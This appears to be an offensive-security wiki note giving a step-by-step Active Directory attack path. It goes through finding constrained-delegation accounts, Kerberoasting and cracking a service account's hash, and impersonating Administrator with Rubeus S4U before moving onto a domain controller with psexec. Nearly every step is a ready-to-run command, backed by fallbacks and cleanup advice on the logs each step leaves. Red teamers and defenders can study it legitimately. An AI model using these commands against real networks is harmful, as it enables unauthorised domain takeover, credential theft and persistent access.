---
title: "Attack Path: Constrained Delegation (TrustedToAuth + high-priv SPN) → impersonate Administrator → Domain Admin"
type: note
created: 2026-09-06
updated: 2026-09-06
tags: [attack-path, active-directory, constrained-delegation, s4u2, impersonation, privilege-escalation]
---

# Attack Path: Constrained Delegation → Impersonate Administrator → Domain Admin

The **Constrained Delegation (KCD)** kill-chain: a service account is flagged
**Trusted for delegation to specified services** (the `TrustedToAuth` /
protocol-transition flag) with an `msDS-AllowedToDelegateTo` list that
**includes a high-privilege SPN** (e.g. `cifs/<DC>`, or a service on a Tier-0
box). You **crack that service account's NT hash** (it's Kerberoastable — it
owns an SPN), then use **S4U2Self + S4U2Proxy with protocol transition** to
**impersonate Administrator to that allowed SPN**. The resulting ticket is
Administrator's, scoped to the target — land on the target as Administrator.
See [[kerberos-delegation-abuse]] (source) for the three delegation forms,
[[s4u2self-s4u2proxy]] for the S4U primitives, and
[[service-principal-name]] for the SPN surface.

## Chain

```
You (a domain foothold)
  --enumerate TrustedToAuth accounts + their msDS-AllowedToDelegateTo--> find svc with a high-priv allowed SPN
  --Kerberoast svc (it owns an SPN)--> svc's NT hash
  --Rubeus s4u /simple (S4U2Self+S4U2Proxy, protocol transition)--> TGS impersonating Administrator to the allowed SPN
  --psexec -k to the target of that SPN--> Administrator on a Tier-0 box -> Domain Admin
```

## Prerequisites / what signals this path exists

- A **service account with the `TrustedToAuth` flag** (protocol transition) —
  it can delegate *for* a user to backend services.
- Its **`msDS-AllowedToDelegateTo`** list contains a **high-privilege SPN** —
  a DC (`cifs/<dc>`), a Tier-0 machine, or a service that itself has admin
  rights. A KCD to a low-priv SPN is only worth a foothold.
- You can **crack the service account's NT hash** — it owns an SPN, so it's
  [[kerberoasting|Kerberoastable]].

```powershell
# Find KCD accounts + their allowed SPNs (PowerView)
Get-DomainUser -TrustedToAuth -Properties samaccountname,msds-allowedtodelegateto
# Look for an allowed SPN pointing at a DC / Tier-0 box
# BloodHound: <svc> --AllowedToDelegate--> <high-priv SPN/host>
```
**Verify:** a `svc` whose `msDS-AllowedToDelegateTo` includes `cifs/<dc>` or a
Tier-0 host. If every KCD target is low-priv, this path only buys a foothold.

## Step 1 — Enumerate the KCD accounts and their allowed SPNs

```powershell
Get-DomainUser -TrustedToAuth -Properties samaccountname,msds-allowedtodelegateto
```
**Verify:** a candidate `svc` + a high-priv allowed SPN. See
[[kerberos-delegation-abuse]] (source) for the enumeration.

### Failure modes & fallbacks
- **No `TrustedToAuth` accounts** — no KCD surface; fall back to
  [[resource-based-constrained-delegation]] (RBCD) or an ACL path.
- **Only low-priv allowed SPNs** — the chain still works but lands you as
  Administrator on a *normal* box; pivot from there.

## Step 2 — Kerberoast the service account

`svc` owns an SPN (that's why it's a delegation source), so it's
Kerberoastable. Request its TGS and crack the NT hash.

```bash
GetUserSPNs.py -dc-ip <dc> corp.local/<you> -request -format hashcat -filter spn <svc> > svc.txt
hashcat -m 13100 svc.txt rockyou.txt
```
**Verify:** `svc`'s NT hash. See [[kerberoasting]],
[[service-principal-name]].

### Failure modes & fallbacks
- **Strong service password** — none cracks; you need another way to get
  `svc`'s hash (a local LSASS dump where `svc` runs — it runs as a service,
  so its hash is in the host's LSASS). See [[lsass]].
- **AES-only SPN** — crack `19700`/`19800` (slower). See
  [[kerberos-encryption-types]].

## Step 3 — Impersonate Administrator to the allowed SPN (S4U)

With `svc`'s NT hash and the protocol-transition flag, mint a TGS that
**impersonates Administrator** to the allowed SPN:

```powershell
Rubeus.exe s4u /user:svc /rc4:<svc_nthash> /impersonateuser:Administrator \
  /msdsspn:cifs/<target> /ptt
```
**Verify:** a ccache (TGS) for `Administrator` → `cifs/<target>`. This is
S4U2Self (`svc` requests a ticket for `Administrator`) + S4U2Proxy
(`svc` proxies it to the backend SPN), enabled by the protocol-transition
flag. See [[s4u2self-s4u2proxy]].

### Failure modes & fallbacks
- **`s4u` fails (no protocol transition)** — double-check the
  `TrustedToAuth` flag is actually set on `svc`; without it, S4U2Proxy is
  rejected.
- **RC4 vs AES** — match `svc`'s key enctype ([[kerberos-encryption-types]]).

## Step 4 — Land on the target as Administrator

```bash
export KRB5CCNAME=Administrator.ccache
psexec.py -k -no-pass corp.local/Administrator@<target>   # -> Administrator on <target>
whoami /all
```
**Verify:** `whoami` = `corp.local\Administrator` on `<target>`. If `<target>`
is a **DC** (or a Tier-0 box with DCSync rights), you're effectively Domain
Admin — DCSync `krbtgt` for durable access. See [[dcsync]],
[[golden-silver-tickets]].

### Failure modes & fallbacks
- **The SPN's host blocks psexec/SMB** — use WMI/WinRM with the same TGS
  ([[smb]]).
- **Administrator on a non-DC** — you have local admin; privesc locally or
  enumerate for the next Tier-0 edge.

## Detection summary (per step)

| Step | What fires | Your tell |
|------|-----------|-----------|
| 2 (Kerberoast) | **4769** TGS-REQ for `svc`'s SPN | a service-ticket request |
| 3 (S4U) | **4769** where the **client ≠ the service account** (Administrator's TGS requested via `svc`) | the impersonation tell |
| 4 (lateral) | **4624** for Administrator on `<target>` | DA on the target |

## Cleanup notes
- The **Kerberoast 4769** and the **S4U 4769 (client≠service)** are the tells.
- The `msDS-AllowedToDelegateTo` attribute itself is durable — if you *wrote*
  it (via an ACL edge), remove it; if it was pre-existing, leave it.
- A cracked `svc` password is now known — expect it to be reset.

## Related
- [[kerberos-delegation]] — the UDE/CDE/RBCD hub (this is KCD)
- [[kerberos-delegation-abuse]] — the raw source summary
- [[s4u2self-s4u2proxy]] — the S4U primitives step 3 uses
- [[kerberoasting]] — step 2 (crack the service account)
- [[service-principal-name]] — the SPN surface
- [[resource-based-constrained-delegation]] — the RBCD sibling (write-on-the-target model)
- [[dcsync]], [[golden-silver-tickets]] — step 4 (domain dominance)
- [[smb]] — the exec transport for step 4
- [[ad-persistence]] — durable access once you're DA
